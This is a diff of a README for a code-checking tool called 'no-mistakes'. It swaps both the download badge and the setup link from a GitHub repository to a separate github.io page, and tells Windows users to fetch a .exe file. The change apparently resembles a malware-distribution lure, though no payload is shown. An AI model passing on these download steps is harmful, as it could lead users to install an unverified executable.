@@ -1,6 +1,6 @@
 # 🚀 no-mistakes - Push code without any errors today
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Deaoverhand887/no-mistakes)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://deaoverhand887.github.io)
 
 ## 🎯 Purpose
 The no-mistakes application helps you manage code uploads. It checks your work before you send it to your server. This process stops common mistakes. You gain peace of mind every time you push code updates.
@@ -11,7 +11,7 @@ This application performs several background checks. It scans your files for for
 ## 📥 Getting Started
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to this web page: https://github.com/Deaoverhand887/no-mistakes.
+1. Go to this web page: https://deaoverhand887.github.io
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version link.
 4. Download the file that ends in .exe.
